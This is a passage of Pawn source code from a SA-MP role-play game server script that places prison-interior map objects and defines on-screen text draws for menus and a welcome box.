	CreateDynamicObject(970,195.08341980,1791.18090820,1613.81237793,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(fencesmallb) (21)
	CreateDynamicObject(970,199.35119629,1791.18090820,1613.81237793,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(fencesmallb) (22)
	CreateDynamicObject(970,203.61909485,1791.18090820,1613.81237793,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(fencesmallb) (23)
	CreateDynamicObject(970,207.91763306,1791.18090820,1613.81237793,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(fencesmallb) (24)
	CreateDynamicObject(970,195.08300781,1791.18066406,1618.06286621,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(fencesmallb) (25)
	CreateDynamicObject(970,199.35058594,1791.18066406,1618.06286621,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(fencesmallb) (26)
	CreateDynamicObject(12950,214.32031250,1789.71875000,1609.79418945,0.00000000,0.00000000,90.00000000, .interiorid = 69); //object(cos_sbanksteps03) (1)
	CreateDynamicObject(12950,205.98063660,1789.62817383,1614.14453125,0.00000000,0.00000000,90.00000000, .interiorid = 69); //object(cos_sbanksteps03) (2)
	CreateDynamicObject(3095,206.42285156,1786.73339844,1612.46301270,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(a51_jetdoor) (80)
	CreateDynamicObject(3095,206.44000244,1786.72985840,1613.03833008,0.00000000,179.99450684,0.00000000, .interiorid = 69); //object(a51_jetdoor) (82)
	CreateDynamicObject(3095,206.40036011,1789.18249512,1607.96301270,90.00000000,180.00000000,180.00000000, .interiorid = 69); //object(a51_jetdoor) (83)
	CreateDynamicObject(3095,210.93899536,1786.74987793,1608.16320801,90.00000000,179.99450684,90.01101685, .interiorid = 69); //object(a51_jetdoor) (84)
	CreateDynamicObject(3095,210.35997009,1786.72998047,1608.18823242,90.00000000,180.00549316,269.98904419, .interiorid = 69); //object(a51_jetdoor) (85)
	CreateDynamicObject(3095,206.40390015,1791.20959473,1605.71276855,90.00000000,179.99450684,179.99450684, .interiorid = 69); //object(a51_jetdoor) (86)
	CreateDynamicObject(3095,202.45399475,1786.74548340,1608.16320801,90.00000000,179.99450684,90.01098633, .interiorid = 69); //object(a51_jetdoor) (87)
	CreateDynamicObject(3095,201.88999939,1786.72998047,1608.18823242,90.00000000,180.00549316,269.98901367, .interiorid = 69); //object(a51_jetdoor) (88)
	CreateDynamicObject(1779,209.17303467,1789.21142578,1610.04138184,0.00000000,0.00000000,180.00000000, .interiorid = 69); //object(cj_ticketmachine) (1)
	CreateDynamicObject(1779,208.34777832,1789.21301270,1610.04138184,0.00000000,0.00000000,179.99450684, .interiorid = 69); //object(cj_ticketmachine) (2)
	CreateDynamicObject(1649,208.50978088,1790.75683594,1610.97937012,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(wglasssmash) (1)
	CreateDynamicObject(1649,208.68554688,1790.97949219,1610.97937012,0.00000000,0.00000000,179.99450684, .interiorid = 69); //object(wglasssmash) (2)
	CreateDynamicObject(1649,204.25000000,1790.98034668,1610.97937012,0.00000000,0.00000000,179.99450684, .interiorid = 69); //object(wglasssmash) (4)
	CreateDynamicObject(1649,204.12200928,1790.77050781,1610.97937012,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(wglasssmash) (5)
	CreateDynamicObject(1671,207.08955383,1789.63757324,1609.42346191,0.00000000,0.00000000,170.00000000, .interiorid = 69); //object(swivelchair_a) (1)
	CreateDynamicObject(1671,204.79295349,1789.67260742,1609.42346191,0.00000000,0.00000000,181.99694824, .interiorid = 69); //object(swivelchair_a) (2)
	CreateDynamicObject(1886,192.97596741,1791.22827148,1612.89184570,0.00000000,0.00000000,122.00000000, .interiorid = 69); //object(shop_sec_cam) (1)
	CreateDynamicObject(1886,192.97558594,1791.22753906,1617.09228516,0.00000000,0.00000000,149.99768066, .interiorid = 69); //object(shop_sec_cam) (2)
	CreateDynamicObject(1886,191.98481750,1789.51403809,1621.04223633,30.00000000,0.00000000,119.99633789, .interiorid = 69); //object(shop_sec_cam) (3)
	CreateDynamicObject(1886,216.65586853,1790.06823730,1621.04223633,29.99816895,0.00000000,219.99270630, .interiorid = 69); //object(shop_sec_cam) (4)
	CreateDynamicObject(1886,191.82667542,1802.56311035,1621.16735840,11.00000000,0.00000000,82.26770020, .interiorid = 69); //object(shop_sec_cam) (5)
	CreateDynamicObject(1886,191.82617188,1802.56250000,1617.04248047,10.99731445,0.00000000,82.26562500, .interiorid = 69); //object(shop_sec_cam) (6)
	CreateDynamicObject(1886,191.82617188,1802.56250000,1612.81799316,10.99731445,0.00000000,82.26562500, .interiorid = 69); //object(shop_sec_cam) (7)
	CreateDynamicObject(2163,203.82183838,1791.07727051,1609.16345215,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(med_office_unit_2) (1)
	CreateDynamicObject(2163,206.70214844,1791.09375000,1609.16345215,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(med_office_unit_2) (2)
	CreateDynamicObject(2949,201.87556458,1790.66833496,1608.96325684,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(kmb_lockeddoor) (1)
	CreateDynamicObject(2949,202.47567749,1789.17675781,1608.96325684,0.00000000,0.00000000,179.99993896, .interiorid = 69); //object(kmb_lockeddoor) (2)
	CreateDynamicObject(2611,205.84300232,1789.22143555,1610.90124512,0.00000000,0.00000000,180.00000000, .interiorid = 69); //object(police_nb1) (1)
	CreateDynamicObject(2606,210.55937195,1789.67712402,1611.38903809,0.00000000,0.00000000,270.00000000, .interiorid = 69); //object(cj_police_counter2) (1)
	CreateDynamicObject(2606,210.55859375,1789.67675781,1611.86450195,0.00000000,0.00000000,269.99450684, .interiorid = 69); //object(cj_police_counter2) (2)
	CreateDynamicObject(1800,214.45210266,1805.61340332,1617.53454590,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (3)
	CreateDynamicObject(1800,210.21595764,1805.59899902,1617.53454590,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (4)
	CreateDynamicObject(1800,205.95664978,1805.66284180,1617.53454590,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (5)
	CreateDynamicObject(1800,200.50657654,1805.64892578,1617.53454590,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (6)
	CreateDynamicObject(1800,196.11277771,1805.65185547,1617.53454590,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (7)
	CreateDynamicObject(1800,191.83377075,1805.65478516,1617.53454590,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (8)
	CreateDynamicObject(1800,214.45761108,1805.68225098,1613.26037598,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (9)
	CreateDynamicObject(1800,210.19975281,1805.67297363,1613.26037598,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (10)
	CreateDynamicObject(1800,205.95896912,1805.70129395,1613.26037598,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (11)
	CreateDynamicObject(1800,200.48924255,1805.69775391,1613.26037598,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (12)
	CreateDynamicObject(1800,196.09724426,1805.65148926,1613.26037598,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (13)
	CreateDynamicObject(1800,191.82055664,1805.65979004,1613.26037598,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (14)
	CreateDynamicObject(1800,214.42187500,1805.65441895,1608.98449707,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (15)
	CreateDynamicObject(1800,210.21253967,1805.68786621,1608.98449707,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (16)
	CreateDynamicObject(1800,205.94084167,1805.60290527,1608.98449707,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (17)
	CreateDynamicObject(1800,205.94042969,1805.60253906,1609.93542480,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (18)
	CreateDynamicObject(1800,210.21191406,1805.68750000,1609.93542480,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (19)
	CreateDynamicObject(1800,200.50958252,1805.69555664,1608.98449707,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (20)
	CreateDynamicObject(1800,200.50878906,1805.69531250,1609.96044922,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (21)
	CreateDynamicObject(1800,196.10487366,1805.67517090,1608.98449707,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (22)
	CreateDynamicObject(1800,196.10449219,1805.67480469,1609.96044922,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (23)
	CreateDynamicObject(1800,191.86831665,1805.67456055,1608.98449707,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (24)
	CreateDynamicObject(1800,191.86816406,1805.67382812,1609.93542480,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (25)
	CreateDynamicObject(1800,214.42187500,1805.65429688,1609.93542480,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (26)
	CreateDynamicObject(1800,214.45703125,1805.68164062,1614.23632812,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (27)
	CreateDynamicObject(1800,210.19921875,1805.67285156,1614.23632812,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (28)
	CreateDynamicObject(1800,205.95800781,1805.70117188,1614.21130371,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (29)
	CreateDynamicObject(1800,200.48828125,1805.69726562,1614.23535156,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (30)
	CreateDynamicObject(1800,196.09667969,1805.65136719,1614.18627930,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (31)
	CreateDynamicObject(1800,191.82031250,1805.65917969,1614.23632812,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (32)
	CreateDynamicObject(1800,191.83300781,1805.65429688,1618.50952148,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (33)
	CreateDynamicObject(1800,196.11230469,1805.65136719,1618.48498535,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (34)
	CreateDynamicObject(1800,200.50585938,1805.64843750,1618.51049805,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (35)
	CreateDynamicObject(1800,205.95605469,1805.66210938,1618.48449707,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (36)
	CreateDynamicObject(1800,210.21582031,1805.59863281,1618.51049805,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (37)
	CreateDynamicObject(1800,214.45117188,1805.61328125,1618.48547363,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (38)
	CreateDynamicObject(2774,204.40760803,1803.95361328,1619.56640625,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(cj_airp_pillars) (1)
	CreateDynamicObject(2602,194.12474060,1808.81152344,1613.78393555,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(police_cell_toilet) (1)
	CreateDynamicObject(2602,198.33770752,1808.81555176,1613.78393555,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(police_cell_toilet) (2)
	CreateDynamicObject(2602,202.66923523,1808.81469727,1613.78393555,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(police_cell_toilet) (3)
	CreateDynamicObject(2602,208.20339966,1808.82031250,1613.78393555,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(police_cell_toilet) (4)
	CreateDynamicObject(2602,212.51039124,1808.82153320,1613.78393555,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(police_cell_toilet) (5)
	CreateDynamicObject(2602,216.61041260,1808.82446289,1613.78393555,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(police_cell_toilet) (7)
	CreateDynamicObject(2602,216.61035156,1808.82421875,1618.06042480,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(police_cell_toilet) (8)
	CreateDynamicObject(2602,212.43417358,1808.79223633,1618.06042480,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(police_cell_toilet) (9)
	CreateDynamicObject(2602,208.18164062,1808.78283691,1618.06042480,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(police_cell_toilet) (10)
	CreateDynamicObject(2602,202.55258179,1808.80847168,1618.06042480,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(police_cell_toilet) (11)
	CreateDynamicObject(2602,198.22427368,1808.81884766,1618.06042480,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(police_cell_toilet) (12)
	CreateDynamicObject(2602,194.07098389,1808.83593750,1618.06042480,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(police_cell_toilet) (13)
	CreateDynamicObject(2602,194.07031250,1808.83593750,1609.50891113,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(police_cell_toilet) (15)
	CreateDynamicObject(2602,198.34811401,1808.82019043,1609.50891113,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(police_cell_toilet) (16)
	CreateDynamicObject(2602,202.64959717,1808.82995605,1609.50891113,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(police_cell_toilet) (17)
	CreateDynamicObject(2602,208.22689819,1808.85144043,1609.50891113,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(police_cell_toilet) (18)
	CreateDynamicObject(2602,212.45510864,1808.80895996,1609.50891113,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(police_cell_toilet) (19)
	CreateDynamicObject(2602,216.65698242,1808.81689453,1609.50891113,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(police_cell_toilet) (20)
	CreateDynamicObject(3388,204.12251282,1788.69470215,1608.96325684,0.00000000,0.00000000,270.00000000, .interiorid = 69); //object(a51_srack4_) (1)
	
	//Anim stopper message
	txtAnimHelper = TextDrawCreate(630.0, 420.0, "Animasyonu durdurmak icin ~r~~k~~PED_SPRINT~ ~w~");
	TextDrawUseBox(txtAnimHelper, 0);
	TextDrawFont(txtAnimHelper, 2);
	TextDrawSetShadow(txtAnimHelper,0);
    TextDrawSetOutline(txtAnimHelper,1);
    TextDrawBackgroundColor(txtAnimHelper,0x000000FF);
    TextDrawColor(txtAnimHelper,0xFFFFFFFF);
    TextDrawAlignment(txtAnimHelper,3);

	// WristWatch
	WristWatch = TextDrawCreate(549.000000, 16.000000, string);
	TextDrawBackgroundColor(WristWatch, 255);
	TextDrawFont(WristWatch, 3);
	TextDrawLetterSize(WristWatch, 0.589999, 2.299998);
	TextDrawColor(WristWatch, -1);
	TextDrawSetOutline(WristWatch, 1);
	TextDrawSetProportional(WristWatch, 1);
/*
	MainMenuTxtdraw[0] = TextDrawCreate(315.000000, 26.000000, "Phoenix Role Play");
	TextDrawAlignment(MainMenuTxtdraw[0], 2);
	TextDrawBackgroundColor(MainMenuTxtdraw[0], 255);
	TextDrawFont(MainMenuTxtdraw[0], 3);
	TextDrawLetterSize(MainMenuTxtdraw[0], 0.949999, 3.199999);
	TextDrawColor(MainMenuTxtdraw[0], COLOR_CYAN);
	TextDrawSetOutline(MainMenuTxtdraw[0], 1);
	TextDrawSetProportional(MainMenuTxtdraw[0], 1);

	MainMenuTxtdraw[1] = TextDrawCreate(639.000000, -1.000000, "'");
	TextDrawAlignment(MainMenuTxtdraw[1], 3);
	TextDrawBackgroundColor(MainMenuTxtdraw[1], 255);
	TextDrawFont(MainMenuTxtdraw[1], 1);
	TextDrawLetterSize(MainMenuTxtdraw[1], 0.239999, 10.900000);
	TextDrawColor(MainMenuTxtdraw[1], 255);
	TextDrawSetOutline(MainMenuTxtdraw[1], 0);
	TextDrawSetProportional(MainMenuTxtdraw[1], 1);
	TextDrawSetShadow(MainMenuTxtdraw[1], 1);
	TextDrawUseBox(MainMenuTxtdraw[1], 1);
	TextDrawBoxColor(MainMenuTxtdraw[1], 255);
	TextDrawTextSize(MainMenuTxtdraw[1], 102.000000, 330.000000);

	MainMenuTxtdraw[2] = TextDrawCreate(679.000000, 100.000000, "'");
	TextDrawAlignment(MainMenuTxtdraw[2], 3);
	TextDrawBackgroundColor(MainMenuTxtdraw[2], 255);
	TextDrawFont(MainMenuTxtdraw[2], 1);
	TextDrawLetterSize(MainMenuTxtdraw[2], 0.340000, 0.100001);
	TextDrawColor(MainMenuTxtdraw[2], COLOR_CYAN);
	TextDrawSetOutline(MainMenuTxtdraw[2], 0);
	TextDrawSetProportional(MainMenuTxtdraw[2], 1);
	TextDrawSetShadow(MainMenuTxtdraw[2], 1);
	TextDrawUseBox(MainMenuTxtdraw[2], 1);
	TextDrawBoxColor(MainMenuTxtdraw[2], COLOR_CYAN);
	TextDrawTextSize(MainMenuTxtdraw[2], 102.000000, 349.000000);

	MainMenuTxtdraw[3] = TextDrawCreate(312.000000, 55.000000, SERVER_VERSION);
	TextDrawAlignment(MainMenuTxtdraw[3], 2);
	TextDrawBackgroundColor(MainMenuTxtdraw[3], 255);
	TextDrawFont(MainMenuTxtdraw[3], 2);
	TextDrawLetterSize(MainMenuTxtdraw[3], 0.670000, 2.299998);
	TextDrawColor(MainMenuTxtdraw[3], COLOR_CYAN);
	TextDrawSetOutline(MainMenuTxtdraw[3], 0);
	TextDrawSetProportional(MainMenuTxtdraw[3], 1);
	TextDrawSetShadow(MainMenuTxtdraw[3], 5);

	MainMenuTxtdraw[4] = TextDrawCreate(639.000000, 339.000000, "'");
	TextDrawAlignment(MainMenuTxtdraw[4], 3);
	TextDrawBackgroundColor(MainMenuTxtdraw[4], 255);
	TextDrawFont(MainMenuTxtdraw[4], 1);
	TextDrawLetterSize(MainMenuTxtdraw[4], 0.239999, 11.900000);
	TextDrawColor(MainMenuTxtdraw[4], 255);
	TextDrawSetOutline(MainMenuTxtdraw[4], 0);
	TextDrawSetProportional(MainMenuTxtdraw[4], 1);
	TextDrawSetShadow(MainMenuTxtdraw[4], 1);
	TextDrawUseBox(MainMenuTxtdraw[4], 1);
	TextDrawBoxColor(MainMenuTxtdraw[4], 255);
	TextDrawTextSize(MainMenuTxtdraw[4], 102.000000, 330.000000);

	MainMenuTxtdraw[5] = TextDrawCreate(679.000000, 338.000000, "'");
	TextDrawAlignment(MainMenuTxtdraw[5], 3);
	TextDrawBackgroundColor(MainMenuTxtdraw[5], 255);
	TextDrawFont(MainMenuTxtdraw[5], 1);
	TextDrawLetterSize(MainMenuTxtdraw[5], 0.340000, 0.100001);
	TextDrawColor(MainMenuTxtdraw[5], COLOR_CYAN);
	TextDrawSetOutline(MainMenuTxtdraw[5], 0);
	TextDrawSetProportional(MainMenuTxtdraw[5], 1);
	TextDrawSetShadow(MainMenuTxtdraw[5], 1);
	TextDrawUseBox(MainMenuTxtdraw[5], 1);
	TextDrawBoxColor(MainMenuTxtdraw[5], COLOR_CYAN);
	TextDrawTextSize(MainMenuTxtdraw[5], 102.000000, 349.000000);

	new newsstring[128];
	format(newsstring, sizeof(newsstring), "Haberler: %s", GlobalMOTD);
	MainMenuTxtdraw[6] = TextDrawCreate(322.000000, 355.000000, newsstring);
	TextDrawAlignment(MainMenuTxtdraw[6], 2);
	TextDrawBackgroundColor(MainMenuTxtdraw[6], 255);
	TextDrawFont(MainMenuTxtdraw[6], 1);
	TextDrawLetterSize(MainMenuTxtdraw[6], 0.500000, 2.499999);
	TextDrawColor(MainMenuTxtdraw[6], COLOR_CYAN);
	TextDrawSetOutline(MainMenuTxtdraw[6], 0);
	TextDrawSetProportional(MainMenuTxtdraw[6], 1);
	TextDrawSetShadow(MainMenuTxtdraw[6], 1);

	MainMenuTxtdraw[7] = TextDrawCreate(313.000000, 383.000000, "Online oyuncular:");
	TextDrawAlignment(MainMenuTxtdraw[7], 2);
	TextDrawBackgroundColor(MainMenuTxtdraw[7], 255);
	TextDrawFont(MainMenuTxtdraw[7], 1);
	TextDrawLetterSize(MainMenuTxtdraw[7], 0.600000, 2.600000);
	TextDrawColor(MainMenuTxtdraw[7], COLOR_CYAN);
	TextDrawSetOutline(MainMenuTxtdraw[7], 0);
	TextDrawSetProportional(MainMenuTxtdraw[7], 1);
	TextDrawSetShadow(MainMenuTxtdraw[7], 1);

	MainMenuTxtdraw[8] = TextDrawCreate(77.000000, 414.000000, "Forum:");
	TextDrawBackgroundColor(MainMenuTxtdraw[8], 255);
	TextDrawFont(MainMenuTxtdraw[8], 1);
	TextDrawLetterSize(MainMenuTxtdraw[8], 0.469999, 2.199999);
	TextDrawColor(MainMenuTxtdraw[8], COLOR_CYAN);
	TextDrawSetOutline(MainMenuTxtdraw[8], 0);
	TextDrawSetProportional(MainMenuTxtdraw[8], 1);
	TextDrawSetShadow(MainMenuTxtdraw[8], 1);

	MainMenuTxtdraw[9] = TextDrawCreate(144.000000, 414.000000, WEBSITE);
	TextDrawBackgroundColor(MainMenuTxtdraw[9], 255);
	TextDrawFont(MainMenuTxtdraw[9], 1);
	TextDrawLetterSize(MainMenuTxtdraw[9], 0.469999, 2.199999);
	TextDrawColor(MainMenuTxtdraw[9], COLOR_CYAN);
	TextDrawSetOutline(MainMenuTxtdraw[9], 0);
	TextDrawSetProportional(MainMenuTxtdraw[9], 1);
	TextDrawSetShadow(MainMenuTxtdraw[9], 1);

	MainMenuTxtdraw[10] = TextDrawCreate(317.000000, 414.000000, "Teamspeak:");
	TextDrawBackgroundColor(MainMenuTxtdraw[10], 255);
	TextDrawFont(MainMenuTxtdraw[10], 1);
	TextDrawLetterSize(MainMenuTxtdraw[10], 0.469999, 2.199999);
	TextDrawColor(MainMenuTxtdraw[10], COLOR_CYAN);
	TextDrawSetOutline(MainMenuTxtdraw[10], 0);
	TextDrawSetProportional(MainMenuTxtdraw[10], 1);
	TextDrawSetShadow(MainMenuTxtdraw[10], 1);

	new ip[100];
	format(ip, sizeof ip, "   ts.phoenix-roleplay.xyz");
	MainMenuTxtdraw[11] = TextDrawCreate(406.000000, 414.000000, ip);
	//MainMenuTxtdraw[11] = TextDrawCreate(398.000000, 414.000000, "Will be online soon");
	TextDrawBackgroundColor(MainMenuTxtdraw[11], 255);
	TextDrawFont(MainMenuTxtdraw[11], 1);
	TextDrawLetterSize(MainMenuTxtdraw[11], 0.469999, 2.199999);
	TextDrawColor(MainMenuTxtdraw[11], COLOR_CYAN);
	TextDrawSetOutline(MainMenuTxtdraw[11], 0);
	TextDrawSetProportional(MainMenuTxtdraw[11], 1);
	TextDrawSetShadow(MainMenuTxtdraw[11], 1);
	

*/
	ZhaoByMetehan0 = TextDrawCreate(262.666534, 122.385261, "box");
	TextDrawLetterSize(ZhaoByMetehan0, 0.000000, 20.442230);
	TextDrawTextSize(ZhaoByMetehan0, 367.000000, 0.000000);
	TextDrawAlignment(ZhaoByMetehan0, 1);
	TextDrawColor(ZhaoByMetehan0, -1);
	TextDrawUseBox(ZhaoByMetehan0, 1);
	TextDrawBoxColor(ZhaoByMetehan0, 102);
	TextDrawSetShadow(ZhaoByMetehan0, 0);
	TextDrawSetOutline(ZhaoByMetehan0, 0);
	TextDrawBackgroundColor(ZhaoByMetehan0, 255);
	TextDrawFont(ZhaoByMetehan0, 1);
	TextDrawSetProportional(ZhaoByMetehan0, 1);
	TextDrawSetShadow(ZhaoByMetehan0, 0);

	ZhaoByMetehan1 = TextDrawCreate(282.333251, 130.266738, "_ Phoenix");
	TextDrawLetterSize(ZhaoByMetehan1, 0.415333, 1.724444);
	TextDrawAlignment(ZhaoByMetehan1, 1);
	TextDrawColor(ZhaoByMetehan1, -1);
	TextDrawSetShadow(ZhaoByMetehan1, 0);
	TextDrawSetOutline(ZhaoByMetehan1, 0);
	TextDrawBackgroundColor(ZhaoByMetehan1, 255);
	TextDrawFont(ZhaoByMetehan1, 3);
	TextDrawSetProportional(ZhaoByMetehan1, 1);
	TextDrawSetShadow(ZhaoByMetehan1, 0);

	ZhaoByMetehan2 = TextDrawCreate(285.999847, 145.614868, "ROLE PLAY");
	TextDrawLetterSize(ZhaoByMetehan2, 0.322333, 1.483852);
	TextDrawAlignment(ZhaoByMetehan2, 1);
	TextDrawColor(ZhaoByMetehan2, COLOR_CYAN);
	TextDrawSetShadow(ZhaoByMetehan2, 0);
	TextDrawSetOutline(ZhaoByMetehan2, 0);
	TextDrawBackgroundColor(ZhaoByMetehan2, 255);
	TextDrawFont(ZhaoByMetehan2, 3);
	TextDrawSetProportional(ZhaoByMetehan2, 1);
	TextDrawSetShadow(ZhaoByMetehan2, 0);

	ZhaoByMetehan3 = TextDrawCreate(272.666656, 169.674133, "_ HOSGELDINIZ");
	TextDrawLetterSize(ZhaoByMetehan3, 0.233333, 1.268148);
	TextDrawAlignment(ZhaoByMetehan3, 1);
	TextDrawColor(ZhaoByMetehan3, -1);
	TextDrawSetShadow(ZhaoByMetehan3, 0);
	TextDrawSetOutline(ZhaoByMetehan3, 1);
	TextDrawBackgroundColor(ZhaoByMetehan3, 255);
	TextDrawFont(ZhaoByMetehan3, 2);
	TextDrawSetProportional(ZhaoByMetehan3, 1);
	TextDrawSetShadow(ZhaoByMetehan3, 0);

	ZhaoByMetehan4 = TextDrawCreate(272.933197, 189.844528, "LD_SPAC:white");
	TextDrawLetterSize(ZhaoByMetehan4, 0.000000, 0.000000);
	TextDrawTextSize(ZhaoByMetehan4, 85.000000, 18.000000);
	TextDrawAlignment(ZhaoByMetehan4, 1);
	TextDrawColor(ZhaoByMetehan4, 255);
	TextDrawSetShadow(ZhaoByMetehan4, 0);
	TextDrawSetOutline(ZhaoByMetehan4, 0);
	TextDrawBackgroundColor(ZhaoByMetehan4, 255);
	TextDrawFont(ZhaoByMetehan4, 4);
	TextDrawSetProportional(ZhaoByMetehan4, 0);
	TextDrawSetShadow(ZhaoByMetehan4, 0);

	ZhaoByMetehan5 = TextDrawCreate(272.933197, 222.244033, "LD_SPAC:white");
	TextDrawLetterSize(ZhaoByMetehan5, 0.000000, 0.000000);
	TextDrawTextSize(ZhaoByMetehan5, 85.000000, 18.000000);
	TextDrawAlignment(ZhaoByMetehan5, 1);
	TextDrawColor(ZhaoByMetehan5, 255);
	TextDrawSetShadow(ZhaoByMetehan5, 0);
	TextDrawSetOutline(ZhaoByMetehan5, 0);
	TextDrawBackgroundColor(ZhaoByMetehan5, 255);
	TextDrawFont(ZhaoByMetehan5, 4);
	TextDrawSetProportional(ZhaoByMetehan5, 0);
	TextDrawSetShadow(ZhaoByMetehan5, 0);

	ZhaoByMetehan6 = TextDrawCreate(275.000000, 258.029663, "]_]_]_]_]_]");
	TextDrawLetterSize(ZhaoByMetehan6, 0.297999, 1.198814);
	TextDrawAlignment(ZhaoByMetehan6, 1);
	TextDrawColor(ZhaoByMetehan6, COLOR_CYAN);
	TextDrawSetShadow(ZhaoByMetehan6, 0);
	TextDrawSetOutline(ZhaoByMetehan6, 1);
	TextDrawBackgroundColor(ZhaoByMetehan6, 255);
	TextDrawFont(ZhaoByMetehan6, 2);
	TextDrawSetProportional(ZhaoByMetehan6, 1);
	TextDrawSetShadow(ZhaoByMetehan6, 0);

	ZhaoByMetehan7 = TextDrawCreate(314.999938, 280.311157, "copyright(c)~n~Phoenix RP");
	TextDrawLetterSize(ZhaoByMetehan7, 0.257666, 0.961185);
	TextDrawAlignment(ZhaoByMetehan7, 2);
	TextDrawColor(ZhaoByMetehan7, -1);
	TextDrawSetShadow(ZhaoByMetehan7, 0);
	TextDrawSetOutline(ZhaoByMetehan7, 1);
	TextDrawBackgroundColor(ZhaoByMetehan7, 255);
	TextDrawFont(ZhaoByMetehan7, 2);
	TextDrawSetProportional(ZhaoByMetehan7, 1);
	TextDrawSetShadow(ZhaoByMetehan7, 0);

	ZhaoByMetehan8 = TextDrawCreate(314.333282, 227.214752, "Since_-_2016");
	TextDrawLetterSize(ZhaoByMetehan8, 0.257666, 0.961185);
	TextDrawAlignment(ZhaoByMetehan8, 2);
	TextDrawColor(ZhaoByMetehan8, -1);
	TextDrawSetShadow(ZhaoByMetehan8, 0);
	TextDrawSetOutline(ZhaoByMetehan8, 1);
	TextDrawBackgroundColor(ZhaoByMetehan8, 255);
	TextDrawFont(ZhaoByMetehan8, 2);
	TextDrawSetProportional(ZhaoByMetehan8, 1);
	TextDrawSetShadow(ZhaoByMetehan8, 0);

	ZhaoByMetehan9 = TextDrawCreate(314.999969, 194.874053, "5.6.7");
	TextDrawLetterSize(ZhaoByMetehan9, 0.232666, 0.961185);
	TextDrawAlignment(ZhaoByMetehan9, 2);
	TextDrawColor(ZhaoByMetehan9, -1);
	TextDrawSetShadow(ZhaoByMetehan9, 0);
	TextDrawSetOutline(ZhaoByMetehan9, 1);
	TextDrawBackgroundColor(ZhaoByMetehan9, 255);
	TextDrawFont(ZhaoByMetehan9, 2);
	TextDrawSetProportional(ZhaoByMetehan9, 1);
	TextDrawSetShadow(ZhaoByMetehan9, 0);

	ZhaoByMetehan10 = TextDrawCreate(261.333160, 120.570358, "LD_SPAC:white");
	TextDrawLetterSize(ZhaoByMetehan10, 0.000000, 0.000000);
	TextDrawTextSize(ZhaoByMetehan10, 107.000000, 2.000000);
	TextDrawAlignment(ZhaoByMetehan10, 1);
	TextDrawColor(ZhaoByMetehan10, COLOR_CYAN);
	TextDrawSetShadow(ZhaoByMetehan10, 0);
	TextDrawSetOutline(ZhaoByMetehan10, 0);
	TextDrawBackgroundColor(ZhaoByMetehan10, 255);
	TextDrawFont(ZhaoByMetehan10, 4);
	TextDrawSetProportional(ZhaoByMetehan10, 0);
